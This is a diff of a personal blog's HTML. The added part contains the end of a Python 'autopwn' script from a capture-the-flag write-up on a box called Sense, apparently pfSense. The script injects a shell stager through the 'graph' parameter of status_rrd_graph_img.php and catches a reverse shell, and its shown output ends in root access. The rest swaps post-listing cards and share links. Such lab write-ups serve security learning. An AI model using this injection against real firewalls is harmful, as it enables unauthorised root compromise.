+            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+        <span class="n">p2</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+
+        <span class="c1"># Send payload</span>
+        <span class="n">p3</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Sending pty shell payload...&#34;</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;database&#34;</span><span class="p">:</span><span class="s2">&#34;-throughput.rrd&#34;</span><span class="p">,</span> <span class="s2">&#34;graph&#34;</span><span class="p">:</span><span class="s2">&#34;file|printf &#34;</span><span class="o">+</span><span class="n">encoded_stager</span><span class="o">+</span><span class="s2">&#34;|sh|echo &#34;</span><span class="p">}</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/status_rrd_graph_img.php&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+                <span class="n">p3</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+                <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">p3</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;OK&#34;</span><span class="p">)</span>
+
+    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
+            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Web thread exited successfully.&#34;</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_ptyshell_payload</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+<span class="n">ptyshell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">ptyshell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">ptyshell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span></code></pre></div></p>
+
+<p>Let&rsquo;s run it:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ./autopwn_sense.py
+[+] Trying to bind to 0.0.0.0 on port 60001: Done
+[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.60 on port 49022
+[+] Connecting to get csrf token: csrfMagicToken = sid:5fcb86e278c2e4cb6b5aa5b4346218a9fb4d1647,1521716176
+[+] Logging in: Status 200
+[+] Sending pty shell payload...: OK
+[*] Switching to interactive mode
+# $ whoami
+root</code></pre></div></div></p>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&t=Microvilli%20%28available%20in%20greek%20only%29" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&text=Microvilli%20%28available%20in%20greek%20only%29&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fmicrovilli%2f&text=%ce%9c%ce%b9%ce%ba%cf%81%ce%bf%ce%bb%ce%ac%cf%87%ce%bd%ce%b5%cf%82&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmicrovilli%2f&description=Microvilli%20%28available%20in%20greek%20only%29&media=https://alamot.github.io/images/microvilli.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fmicrovilli%2f&description=%ce%9c%ce%b9%ce%ba%cf%81%ce%bf%ce%bb%ce%ac%cf%87%ce%bd%ce%b5%cf%82&media=https://alamot.github.io/images/microvilli.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fsense_writeup%2f&t=Sense%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fsense_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fsense_writeup%2f&text=Sense%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fsense_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Sense&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fsense_writeup%2f&description=Sense%20write-up&media=https://alamot.github.io/images/pfsense.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fsense_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Sense&media=https://alamot.github.io/images/pfsense.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -379,81 +563,121 @@ if (language) {
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
-           
-           
-          
-           
-           
-           
           
            
-           
-           
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
            
            
-          
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
-           
           
-           
            
            
-          
-           
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
-           
-           
-          
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -816,8 +1040,6 @@ if (language) {
            
            
           
-          
-           
            
            
            
@@ -825,9 +1047,7 @@ if (language) {
            
            
            
-           
           
-           
            
            
            
@@ -835,9 +1055,7 @@ if (language) {
            
            
            
-           
           
-           
            
            
            
@@ -845,14 +1063,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -860,9 +1075,7 @@ if (language) {
            
            
            
-           
           
-           
            
            
            
@@ -870,14 +1083,11 @@ if (language) {
            
            
            
-           
           
            
            
            
-           
           
-           
            
            
            
@@ -885,28 +1095,23 @@ if (language) {
            
            
            
-           
           
-           
-           
-           
-           
           
            
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/testakia_viologias/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/testakia_viologias.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Biology tests (available in greek only)</h3>
-      <h3 class="title" lang="el">Τεστάκια Βιολογίας</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Aug 2015</time>
-      <time lang="el">22 Αυγ 2015</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -952,231 +1157,10 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mindcontrol_parasites/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/brain_signals.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mind control parasites. How do they do it?</h3>
-      <h3 class="title" lang="el">Παράσιτα που ελέγχουν το μυαλό. Πώς το κάνουν;</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Oct 2013</time>
-      <time lang="el">03 Οκτ 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amylpred2/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amylpred2.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">A consensus method for the prediction of aggregation-prone peptides in globular proteins</h3>
-      <h3 class="title" lang="el">Μια συναινετική μέθοδος πρόγνωσης πεπτιδίων που εμφανίζουν τάση προς συσσωμάτωση στις σφαιρικές πρωτεΐνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Jan 2013</time>
-      <time lang="el">10 Ιαν 2013</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/ess/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/hawkdove.png);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Evolutionarily Stable Strategies (available in greek only)</h3>
-      <h3 class="title" lang="el">Εξελικτικά Σταθερές Στρατηγικές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Nov 2012</time>
-      <time lang="el">01 Νοε 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amyloids/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amyloid.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Amyloid fibrils (available in greek only)</h3>
-      <h3 class="title" lang="el">Αμυλοειδή ινίδια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Jul 2012</time>
-      <time lang="el">11 Ιουλ 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/centrioles/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/centrioles.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Centrioles (available in greek only)</h3>
-      <h3 class="title" lang="el">Κεντριόλια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jan 2012</time>
-      <time lang="el">22 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/multifunctional_proteins/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/multifunction.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Multifunctional proteins and evolution (available in greek only)</h3>
-      <h3 class="title" lang="el">Πολυλειτουργικές πρωτεΐνες και εξέλιξη</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Jan 2012</time>
-      <time lang="el">17 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/evolution_of_cetaceans/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dolphin.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The evolution of Cetaceans (available in greek only)</h3>
-      <h3 class="title" lang="el">Η εξέλιξη των Kητωδών</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2011</time>
-      <time lang="el">17 Νοε 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/smallest_genome/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microscope.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The organism with the smallest genome and proteome</h3>
-      <h3 class="title" lang="el">Ο οργανισμός με το μικρότερο γονιδιώμα και πρωτέωμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">06 Aug 2011</time>
-      <time lang="el">06 Αυγ 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/entomopathogenic_fungi/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ep_fungi.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Entomopathogenic fungi (available in greek only)</h3>
-      <h3 class="title" lang="el">Εντομοπαθογόνοι μύκητες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Nov 2010</time>
-      <time lang="el">22 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/intraspecific_and_interspecific_competition/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/competition.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Intraspecific and Interspecific competition (available in greek only)</h3>
-      <h3 class="title" lang="el">Ενδοειδικός και Διαειδικός ανταγωνισμός</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2010</time>
-      <time lang="el">17 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/theories_of_intelligence/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/intelligence.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Theories of intelligence (available in greek only)</h3>
-      <h3 class="title" lang="el">Θεωρίες νοημοσύνης</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2010</time>
-      <time lang="el">01 Ιουν 2010</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1188,21 +1172,10 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/electric_current_and_human_body/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/electric.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Electric current and human body (available in greek only)</h3>
-      <h3 class="title" lang="el">Ηλεκτρικό ρεύμα και ανθρώπινο σώμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2009</time>
-      <time lang="el">01 Ιουν 2009</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
            
           
            
@@ -1224,21 +1197,120 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/brucellosis/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/Brucella.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Brucellosis (available in greek only)</h3>
-      <h3 class="title" lang="el">Βρουκέλλωση (Μελιταίος πυρετός)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Mar 2004</time>
-      <time lang="el">21 Μαρ 2004</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
